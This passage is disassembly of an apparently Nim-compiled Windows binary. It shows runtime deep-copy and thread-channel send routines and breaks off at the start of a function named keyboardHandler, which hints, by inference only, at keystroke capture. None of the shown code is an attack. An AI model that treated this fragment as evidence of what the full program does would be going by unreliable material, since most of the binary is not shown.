  405759:	74 0d                	je     405768 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x62>
  40575b:	3c 16                	cmp    $0x16,%al
  40575d:	0f 85 5a 02 00 00    	jne    4059bd <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x2b7>
  405763:	e9 2c 01 00 00       	jmp    405894 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x18e>
  405768:	45 84 c9             	test   %r9b,%r9b
  40576b:	48 8b 2a             	mov    (%rdx),%rbp
  40576e:	74 39                	je     4057a9 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0xa3>
  405770:	48 85 ed             	test   %rbp,%rbp
  405773:	74 7e                	je     4057f3 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0xed>
  405775:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  405779:	48 8d 75 10          	lea    0x10(%rbp),%rsi
  40577d:	e8 d1 e8 ff ff       	call   404053 <rawNewStringNoInit>
  405782:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  405786:	48 8d 50 10          	lea    0x10(%rax),%rdx
  40578a:	48 89 d7             	mov    %rdx,%rdi
  40578d:	48 89 c2             	mov    %rax,%rdx
  405790:	48 89 08             	mov    %rcx,(%rax)
  405793:	48 ff c1             	inc    %rcx
  405796:	f3 a4                	rep movsb (%rsi),(%rdi)
  405798:	48 89 d9             	mov    %rbx,%rcx
  40579b:	e8 22 d7 ff ff       	call   402ec2 <unsureAsgnRef>
  4057a0:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
  4057a4:	e9 38 01 00 00       	jmp    4058e1 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x1db>
  4057a9:	48 85 ed             	test   %rbp,%rbp
  4057ac:	74 39                	je     4057e7 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0xe1>
  4057ae:	48 8b 45 00          	mov    0x0(%rbp),%rax
  4057b2:	48 8d 0d f7 56 02 00 	lea    0x256f7(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  4057b9:	48 89 ee             	mov    %rbp,%rsi
  4057bc:	48 8d 50 11          	lea    0x11(%rax),%rdx
  4057c0:	e8 61 d3 ff ff       	call   402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>
  4057c5:	48 8b 7d 00          	mov    0x0(%rbp),%rdi
  4057c9:	48 8d 4f 11          	lea    0x11(%rdi),%rcx
  4057cd:	48 89 c7             	mov    %rax,%rdi
  4057d0:	f3 a4                	rep movsb (%rsi),(%rdi)
  4057d2:	48 89 03             	mov    %rax,(%rbx)
  4057d5:	e9 ec 01 00 00       	jmp    4059c6 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x2c0>
  4057da:	48 8b 32             	mov    (%rdx),%rsi
  4057dd:	48 85 f6             	test   %rsi,%rsi
  4057e0:	75 2b                	jne    40580d <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x107>
  4057e2:	40 84 ff             	test   %dil,%dil
  4057e5:	75 0c                	jne    4057f3 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0xed>
  4057e7:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  4057ee:	e9 d3 01 00 00       	jmp    4059c6 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x2c0>
  4057f3:	31 d2                	xor    %edx,%edx
  4057f5:	48 89 d9             	mov    %rbx,%rcx
  4057f8:	48 83 c4 28          	add    $0x28,%rsp
  4057fc:	5b                   	pop    %rbx
  4057fd:	5e                   	pop    %rsi
  4057fe:	5f                   	pop    %rdi
  4057ff:	5d                   	pop    %rbp
  405800:	41 5c                	pop    %r12
  405802:	41 5d                	pop    %r13
  405804:	41 5e                	pop    %r14
  405806:	41 5f                	pop    %r15
  405808:	e9 b5 d6 ff ff       	jmp    402ec2 <unsureAsgnRef>
  40580d:	45 84 c9             	test   %r9b,%r9b
  405810:	48 8b 16             	mov    (%rsi),%rdx
  405813:	74 15                	je     40582a <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x124>
  405815:	4c 89 c1             	mov    %r8,%rcx
  405818:	e8 ba fe ff ff       	call   4056d7 <newSeq>
  40581d:	48 89 d9             	mov    %rbx,%rcx
  405820:	48 89 c2             	mov    %rax,%rdx
  405823:	e8 9a d6 ff ff       	call   402ec2 <unsureAsgnRef>
  405828:	eb 1b                	jmp    405845 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x13f>
  40582a:	49 8b 40 10          	mov    0x10(%r8),%rax
  40582e:	48 8d 0d 7b 56 02 00 	lea    0x2567b(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  405835:	48 0f af 10          	imul   (%rax),%rdx
  405839:	48 83 c2 10          	add    $0x10,%rdx
  40583d:	e8 f8 d6 ff ff       	call   402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>
  405842:	48 89 03             	mov    %rax,(%rbx)
  405845:	48 8b 1b             	mov    (%rbx),%rbx
  405848:	4c 8d 7e 10          	lea    0x10(%rsi),%r15
  40584c:	45 31 f6             	xor    %r14d,%r14d
  40584f:	4c 8b 2e             	mov    (%rsi),%r13
  405852:	48 83 c3 10          	add    $0x10,%rbx
  405856:	4c 89 6b f0          	mov    %r13,-0x10(%rbx)
  40585a:	4c 89 6b f8          	mov    %r13,-0x8(%rbx)
  40585e:	49 ff cd             	dec    %r13
  405861:	4d 39 f5             	cmp    %r14,%r13
  405864:	7d 0f                	jge    405875 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x16f>
  405866:	40 84 ff             	test   %dil,%dil
  405869:	0f 84 57 01 00 00    	je     4059c6 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x2c0>
  40586f:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
  405873:	eb 6c                	jmp    4058e1 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x1db>
  405875:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  405879:	45 89 e1             	mov    %r12d,%r9d
  40587c:	49 8b 08             	mov    (%r8),%rcx
  40587f:	49 0f af ce          	imul   %r14,%rcx
  405883:	49 ff c6             	inc    %r14
  405886:	49 8d 14 0f          	lea    (%r15,%rcx,1),%rdx
  40588a:	48 01 d9             	add    %rbx,%rcx
  40588d:	e8 74 fe ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>
  405892:	eb cd                	jmp    405861 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x15b>
  405894:	48 8b 32             	mov    (%rdx),%rsi
  405897:	48 85 f6             	test   %rsi,%rsi
  40589a:	0f 84 42 ff ff ff    	je     4057e2 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0xdc>
  4058a0:	4c 8d 66 f0          	lea    -0x10(%rsi),%r12
  4058a4:	45 84 c9             	test   %r9b,%r9b
  4058a7:	0f 84 cc 00 00 00    	je     405979 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x273>
  4058ad:	48 8b 2e             	mov    (%rsi),%rbp
  4058b0:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4058b4:	48 89 e9             	mov    %rbp,%rcx
  4058b7:	48 8b 10             	mov    (%rax),%rdx
  4058ba:	e8 27 e4 ff ff       	call   403ce6 <newObj>
  4058bf:	48 89 d9             	mov    %rbx,%rcx
  4058c2:	48 89 c2             	mov    %rax,%rdx
  4058c5:	e8 f8 d5 ff ff       	call   402ec2 <unsureAsgnRef>
  4058ca:	48 8b 0b             	mov    (%rbx),%rcx
  4058cd:	48 8d 56 08          	lea    0x8(%rsi),%rdx
  4058d1:	44 0f b6 cf          	movzbl %dil,%r9d
  4058d5:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  4058d9:	e8 28 fe ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>
  4058de:	4c 89 e2             	mov    %r12,%rdx
  4058e1:	48 8d 0d c8 55 02 00 	lea    0x255c8(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  4058e8:	48 83 c4 28          	add    $0x28,%rsp
  4058ec:	5b                   	pop    %rbx
  4058ed:	5e                   	pop    %rsi
  4058ee:	5f                   	pop    %rdi
  4058ef:	5d                   	pop    %rbp
  4058f0:	41 5c                	pop    %r12
  4058f2:	41 5d                	pop    %r13
  4058f4:	41 5e                	pop    %r14
  4058f6:	41 5f                	pop    %r15
  4058f8:	e9 17 cb ff ff       	jmp    402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  4058fd:	4d 8b 40 10          	mov    0x10(%r8),%r8
  405901:	41 0f b6 f9          	movzbl %r9b,%edi
  405905:	4d 85 c0             	test   %r8,%r8
  405908:	75 08                	jne    405912 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x20c>
  40590a:	48 8b 02             	mov    (%rdx),%rax
  40590d:	48 89 01             	mov    %rax,(%rcx)
  405910:	eb 08                	jmp    40591a <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x214>
  405912:	41 89 f9             	mov    %edi,%r9d
  405915:	e8 ec fd ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>
  40591a:	41 89 f9             	mov    %edi,%r9d
  40591d:	eb 04                	jmp    405923 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x21d>
  40591f:	45 0f b6 c9          	movzbl %r9b,%r9d
  405923:	4c 8b 45 18          	mov    0x18(%rbp),%r8
  405927:	48 89 f2             	mov    %rsi,%rdx
  40592a:	48 89 d9             	mov    %rbx,%rcx
  40592d:	48 83 c4 28          	add    $0x28,%rsp
  405931:	5b                   	pop    %rbx
  405932:	5e                   	pop    %rsi
  405933:	5f                   	pop    %rdi
  405934:	5d                   	pop    %rbp
  405935:	41 5c                	pop    %r12
  405937:	41 5d                	pop    %r13
  405939:	41 5e                	pop    %r14
  40593b:	41 5f                	pop    %r15
  40593d:	e9 95 00 00 00       	jmp    4059d7 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24>
  405942:	48 8b 45 00          	mov    0x0(%rbp),%rax
  405946:	48 8b 7d 10          	mov    0x10(%rbp),%rdi
  40594a:	48 99                	cqto
  40594c:	48 f7 3f             	idivq  (%rdi)
  40594f:	4c 8d 68 ff          	lea    -0x1(%rax),%r13
  405953:	31 ff                	xor    %edi,%edi
  405955:	49 39 fd             	cmp    %rdi,%r13
  405958:	7c 6c                	jl     4059c6 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x2c0>
  40595a:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  40595e:	45 89 e1             	mov    %r12d,%r9d
  405961:	49 8b 08             	mov    (%r8),%rcx
  405964:	48 0f af cf          	imul   %rdi,%rcx
  405968:	48 ff c7             	inc    %rdi
  40596b:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
  40596f:	48 01 d9             	add    %rbx,%rcx
  405972:	e8 8f fd ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>
  405977:	eb dc                	jmp    405955 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23+0x24f>
  405979:	48 8b 7e f8          	mov    -0x8(%rsi),%rdi
  40597d:	48 8d 0d 2c 55 02 00 	lea    0x2552c(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  405984:	48 8b 47 10          	mov    0x10(%rdi),%rax
  405988:	48 8b 10             	mov    (%rax),%rdx
  40598b:	48 83 c2 08          	add    $0x8,%rdx
  40598f:	e8 a6 d5 ff ff       	call   402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>
  405994:	45 31 c9             	xor    %r9d,%r9d
  405997:	48 89 f2             	mov    %rsi,%rdx
  40599a:	48 89 03             	mov    %rax,(%rbx)
  40599d:	48 8d 48 08          	lea    0x8(%rax),%rcx
  4059a1:	48 89 38             	mov    %rdi,(%rax)
  4059a4:	4c 8b 47 10          	mov    0x10(%rdi),%r8
  4059a8:	48 83 c4 28          	add    $0x28,%rsp
  4059ac:	5b                   	pop    %rbx
  4059ad:	5e                   	pop    %rsi
  4059ae:	5f                   	pop    %rdi
  4059af:	5d                   	pop    %rbp
  4059b0:	41 5c                	pop    %r12
  4059b2:	41 5d                	pop    %r13
  4059b4:	41 5e                	pop    %r14
  4059b6:	41 5f                	pop    %r15
  4059b8:	e9 49 fd ff ff       	jmp    405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>
  4059bd:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  4059c1:	48 89 df             	mov    %rbx,%rdi
  4059c4:	f3 a4                	rep movsb (%rsi),(%rdi)
  4059c6:	48 83 c4 28          	add    $0x28,%rsp
  4059ca:	5b                   	pop    %rbx
  4059cb:	5e                   	pop    %rsi
  4059cc:	5f                   	pop    %rdi
  4059cd:	5d                   	pop    %rbp
  4059ce:	41 5c                	pop    %r12
  4059d0:	41 5d                	pop    %r13
  4059d2:	41 5e                	pop    %r14
  4059d4:	41 5f                	pop    %r15
  4059d6:	c3                   	ret

00000000004059d7 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24>:
  4059d7:	41 55                	push   %r13
  4059d9:	41 54                	push   %r12
  4059db:	55                   	push   %rbp
  4059dc:	57                   	push   %rdi
  4059dd:	56                   	push   %rsi
  4059de:	53                   	push   %rbx
  4059df:	48 83 ec 28          	sub    $0x28,%rsp
  4059e3:	41 8a 00             	mov    (%r8),%al
  4059e6:	3c 02                	cmp    $0x2,%al
  4059e8:	49 89 cc             	mov    %rcx,%r12
  4059eb:	48 89 d5             	mov    %rdx,%rbp
  4059ee:	4c 89 c3             	mov    %r8,%rbx
  4059f1:	41 0f b6 f9          	movzbl %r9b,%edi
  4059f5:	74 30                	je     405a27 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24+0x50>
  4059f7:	3c 03                	cmp    $0x3,%al
  4059f9:	74 56                	je     405a51 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24+0x7a>
  4059fb:	fe c8                	dec    %al
  4059fd:	0f 85 93 00 00 00    	jne    405a96 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24+0xbf>
  405a03:	49 8b 48 08          	mov    0x8(%r8),%rcx
  405a07:	45 0f b6 c9          	movzbl %r9b,%r9d
  405a0b:	4d 8b 40 10          	mov    0x10(%r8),%r8
  405a0f:	48 8d 14 0a          	lea    (%rdx,%rcx,1),%rdx
  405a13:	4c 01 e1             	add    %r12,%rcx
  405a16:	48 83 c4 28          	add    $0x28,%rsp
  405a1a:	5b                   	pop    %rbx
  405a1b:	5e                   	pop    %rsi
  405a1c:	5f                   	pop    %rdi
  405a1d:	5d                   	pop    %rbp
  405a1e:	41 5c                	pop    %r12
  405a20:	41 5d                	pop    %r13
  405a22:	e9 df fc ff ff       	jmp    405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>
  405a27:	49 8b 40 20          	mov    0x20(%r8),%rax
  405a2b:	31 f6                	xor    %esi,%esi
  405a2d:	4c 8d 68 ff          	lea    -0x1(%rax),%r13
  405a31:	49 39 f5             	cmp    %rsi,%r13
  405a34:	7c 60                	jl     405a96 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24+0xbf>
  405a36:	48 8b 43 28          	mov    0x28(%rbx),%rax
  405a3a:	41 89 f9             	mov    %edi,%r9d
  405a3d:	48 89 ea             	mov    %rbp,%rdx
  405a40:	4c 89 e1             	mov    %r12,%rcx
  405a43:	4c 8b 04 f0          	mov    (%rax,%rsi,8),%r8
  405a47:	48 ff c6             	inc    %rsi
  405a4a:	e8 88 ff ff ff       	call   4059d7 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24>
  405a4f:	eb e0                	jmp    405a31 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24+0x5a>
  405a51:	49 8b 70 08          	mov    0x8(%r8),%rsi
  405a55:	49 8b 50 10          	mov    0x10(%r8),%rdx
  405a59:	48 8d 04 31          	lea    (%rcx,%rsi,1),%rax
  405a5d:	48 01 ee             	add    %rbp,%rsi
  405a60:	48 8b 0a             	mov    (%rdx),%rcx
  405a63:	48 89 c7             	mov    %rax,%rdi
  405a66:	4c 89 c2             	mov    %r8,%rdx
  405a69:	f3 a4                	rep movsb (%rsi),(%rdi)
  405a6b:	48 89 e9             	mov    %rbp,%rcx
  405a6e:	e8 2b bc ff ff       	call   40169e <selectBranch__2us2RQByTh81i9aW4EEgfmw>
  405a73:	48 85 c0             	test   %rax,%rax
  405a76:	49 89 c0             	mov    %rax,%r8
  405a79:	74 1b                	je     405a96 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24+0xbf>
  405a7b:	45 0f b6 c9          	movzbl %r9b,%r9d
  405a7f:	48 89 ea             	mov    %rbp,%rdx
  405a82:	4c 89 e1             	mov    %r12,%rcx
  405a85:	48 83 c4 28          	add    $0x28,%rsp
  405a89:	5b                   	pop    %rbx
  405a8a:	5e                   	pop    %rsi
  405a8b:	5f                   	pop    %rdi
  405a8c:	5d                   	pop    %rbp
  405a8d:	41 5c                	pop    %r12
  405a8f:	41 5d                	pop    %r13
  405a91:	e9 41 ff ff ff       	jmp    4059d7 <storeAux__P9bTEpZhQPzu09aiqLvtrvlQ.constprop.24>
  405a96:	48 83 c4 28          	add    $0x28,%rsp
  405a9a:	5b                   	pop    %rbx
  405a9b:	5e                   	pop    %rsi
  405a9c:	5f                   	pop    %rdi
  405a9d:	5d                   	pop    %rbp
  405a9e:	41 5c                	pop    %r12
  405aa0:	41 5d                	pop    %r13
  405aa2:	c3                   	ret

0000000000405aa3 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21>:
  405aa3:	41 55                	push   %r13
  405aa5:	41 54                	push   %r12
  405aa7:	55                   	push   %rbp
  405aa8:	57                   	push   %rdi
  405aa9:	56                   	push   %rsi
  405aaa:	53                   	push   %rbx
  405aab:	48 83 ec 38          	sub    $0x38,%rsp
  405aaf:	48 83 3d a1 53 02 00 	cmpq   $0xfffffffffffffffe,0x253a1(%rip)        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405ab6:	fe 
  405ab7:	49 89 cc             	mov    %rcx,%r12
  405aba:	74 23                	je     405adf <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0x3c>
  405abc:	48 8d 0d ad 53 02 00 	lea    0x253ad(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  405ac3:	ff 15 a3 27 04 00    	call   *0x427a3(%rip)        # 44826c <__imp_EnterCriticalSection>
  405ac9:	48 83 3d 8f 53 02 00 	cmpq   $0x0,0x2538f(%rip)        # 42ae60 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x20>
  405ad0:	00 
  405ad1:	48 8d 1d c0 53 02 00 	lea    0x253c0(%rip),%rbx        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  405ad8:	7f 75                	jg     405b4f <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0xac>
  405ada:	e9 8a 00 00 00       	jmp    405b69 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0xc6>
  405adf:	48 8d 0d da 52 02 00 	lea    0x252da(%rip),%rcx        # 42adc0 <NTI__A79aQ4kopJRWUJmF9aQu6afA_>
  405ae6:	ba 30 00 00 00       	mov    $0x30,%edx
  405aeb:	e8 f6 e1 ff ff       	call   403ce6 <newObj>
  405af0:	48 8d 0d 09 be 00 00 	lea    0xbe09(%rip),%rcx        # 411900 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_40>
  405af7:	48 89 c3             	mov    %rax,%rbx
  405afa:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  405afe:	48 8d 05 7b 52 02 00 	lea    0x2527b(%rip),%rax        # 42ad80 <NTI__ICSm8pFV59cLfw6i2pFuM9cg_>
  405b05:	48 89 03             	mov    %rax,(%rbx)
  405b08:	48 8d 05 1c 67 00 00 	lea    0x671c(%rip),%rax        # 40c22b <.rdata+0x22b>
  405b0f:	48 89 43 10          	mov    %rax,0x10(%rbx)
  405b13:	e8 28 e1 ff ff       	call   403c40 <copyStringRC1>
  405b18:	48 85 f6             	test   %rsi,%rsi
  405b1b:	48 89 43 18          	mov    %rax,0x18(%rbx)
  405b1f:	74 08                	je     405b29 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0x86>
  405b21:	48 89 f1             	mov    %rsi,%rcx
  405b24:	e8 08 d4 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.80>
  405b29:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  405b30:	00 00 
  405b32:	4c 8d 0d 0c 66 00 00 	lea    0x660c(%rip),%r9        # 40c145 <.rdata+0x145>
  405b39:	48 89 d9             	mov    %rbx,%rcx
  405b3c:	4c 8d 05 0c 66 00 00 	lea    0x660c(%rip),%r8        # 40c14f <.rdata+0x14f>
  405b43:	48 8d 15 e1 66 00 00 	lea    0x66e1(%rip),%rdx        # 40c22b <.rdata+0x22b>
  405b4a:	e8 69 f7 ff ff       	call   4052b8 <raiseExceptionEx>
  405b4f:	48 8b 05 fa 52 02 00 	mov    0x252fa(%rip),%rax        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405b56:	48 39 05 03 53 02 00 	cmp    %rax,0x25303(%rip)        # 42ae60 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x20>
  405b5d:	7f 0a                	jg     405b69 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0xc6>
  405b5f:	48 89 d9             	mov    %rbx,%rcx
  405b62:	e8 e2 bd ff ff       	call   401949 <waitSysCond__1aSBSEAel8lRFkufku8IRA.constprop.25>
  405b67:	eb e6                	jmp    405b4f <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0xac>
  405b69:	48 8b 05 e8 52 02 00 	mov    0x252e8(%rip),%rax        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405b70:	48 8d 2d 89 52 02 00 	lea    0x25289(%rip),%rbp        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  405b77:	48 8d 58 01          	lea    0x1(%rax),%rbx
  405b7b:	48 3b 1d ce 52 02 00 	cmp    0x252ce(%rip),%rbx        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405b82:	0f 8f b7 00 00 00    	jg     405c3f <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0x19c>
  405b88:	48 85 db             	test   %rbx,%rbx
  405b8b:	75 05                	jne    405b92 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0xef>
  405b8d:	bb 01 00 00 00       	mov    $0x1,%ebx
  405b92:	48 8b 15 67 52 02 00 	mov    0x25267(%rip),%rdx        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  405b99:	48 8d 0d 10 53 02 00 	lea    0x25310(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  405ba0:	48 0f af d3          	imul   %rbx,%rdx
  405ba4:	48 01 d2             	add    %rdx,%rdx
  405ba7:	e8 8e d3 ff ff       	call   402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>
  405bac:	4c 8b 15 9d 52 02 00 	mov    0x2529d(%rip),%r10        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405bb3:	4c 8b 0d 86 52 02 00 	mov    0x25286(%rip),%r9        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  405bba:	49 89 c5             	mov    %rax,%r13
  405bbd:	4c 89 d0             	mov    %r10,%rax
  405bc0:	4d 89 d0             	mov    %r10,%r8
  405bc3:	48 8b 15 9e 52 02 00 	mov    0x2529e(%rip),%rdx        # 42ae68 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x28>
  405bca:	49 29 c0             	sub    %rax,%r8
  405bcd:	48 85 c0             	test   %rax,%rax
  405bd0:	7f 17                	jg     405be9 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0x146>
  405bd2:	48 85 d2             	test   %rdx,%rdx
  405bd5:	74 3b                	je     405c12 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0x16f>
  405bd7:	48 8d 0d d2 52 02 00 	lea    0x252d2(%rip),%rcx        # 42aeb0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x70>
  405bde:	48 83 ea 10          	sub    $0x10,%rdx
  405be2:	e8 2d c8 ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  405be7:	eb 29                	jmp    405c12 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0x16f>
  405be9:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  405bed:	48 ff c8             	dec    %rax
  405bf0:	4c 0f af c1          	imul   %rcx,%r8
  405bf4:	48 89 ce             	mov    %rcx,%rsi
  405bf7:	49 0f af f1          	imul   %r9,%rsi
  405bfb:	49 ff c1             	inc    %r9
  405bfe:	4d 01 e8             	add    %r13,%r8
  405c01:	48 01 d6             	add    %rdx,%rsi
  405c04:	4c 89 c7             	mov    %r8,%rdi
  405c07:	f3 a4                	rep movsb (%rsi),(%rdi)
  405c09:	4c 23 0d 48 52 02 00 	and    0x25248(%rip),%r9        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405c10:	eb ae                	jmp    405bc0 <sendImpl__wSGPBHwFnSdhsolDckAk3Q.constprop.21+0x11d>
  405c12:	48 8b 05 37 52 02 00 	mov    0x25237(%rip),%rax        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405c19:	48 01 db             	add    %rbx,%rbx
  405c1c:	4c 89 2d 45 52 02 00 	mov    %r13,0x25245(%rip)        # 42ae68 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x28>
  405c23:	48 c7 05 12 52 02 00 	movq   $0x0,0x25212(%rip)        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  405c2a:	00 00 00 00 
  405c2e:	48 ff cb             	dec    %rbx
  405c31:	48 89 1d 20 52 02 00 	mov    %rbx,0x25220(%rip)        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405c38:	48 89 05 09 52 02 00 	mov    %rax,0x25209(%rip)        # 42ae48 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x8>
  405c3f:	48 8b 0d 02 52 02 00 	mov    0x25202(%rip),%rcx        # 42ae48 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x8>
  405c46:	4c 8d 05 b3 51 02 00 	lea    0x251b3(%rip),%r8        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  405c4d:	45 31 c9             	xor    %r9d,%r9d
  405c50:	4c 89 e2             	mov    %r12,%rdx
  405c53:	48 0f af 0d a5 51 02 	imul   0x251a5(%rip),%rcx        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  405c5a:	00 
  405c5b:	48 03 0d 06 52 02 00 	add    0x25206(%rip),%rcx        # 42ae68 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x28>
  405c62:	e8 9f fa ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.23>
  405c67:	48 8b 05 da 51 02 00 	mov    0x251da(%rip),%rax        # 42ae48 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x8>
  405c6e:	48 89 2d 2b 52 02 00 	mov    %rbp,0x2522b(%rip)        # 42aea0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x60>
  405c75:	48 8d 0d f4 51 02 00 	lea    0x251f4(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  405c7c:	48 ff 05 cd 51 02 00 	incq   0x251cd(%rip)        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  405c83:	48 ff c0             	inc    %rax
  405c86:	48 23 05 cb 51 02 00 	and    0x251cb(%rip),%rax        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  405c8d:	48 89 05 b4 51 02 00 	mov    %rax,0x251b4(%rip)        # 42ae48 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x8>
  405c94:	ff 15 22 26 04 00    	call   *0x42622(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  405c9a:	48 8b 0d f7 51 02 00 	mov    0x251f7(%rip),%rcx        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  405ca1:	ff 15 91 51 02 00    	call   *0x25191(%rip)        # 42ae38 <Dl_1285039_>
  405ca7:	b0 01                	mov    $0x1,%al
  405ca9:	48 83 c4 38          	add    $0x38,%rsp
  405cad:	5b                   	pop    %rbx
  405cae:	5e                   	pop    %rsi
  405caf:	5f                   	pop    %rdi
  405cb0:	5d                   	pop    %rbp
  405cb1:	41 5c                	pop    %r12
  405cb3:	41 5d                	pop    %r13
  405cb5:	c3                   	ret

0000000000405cb6 <keyboardHandler__Zr2szklH0kLshcCDwqx1Hw>:
  405cb6:	41 55                	push   %r13
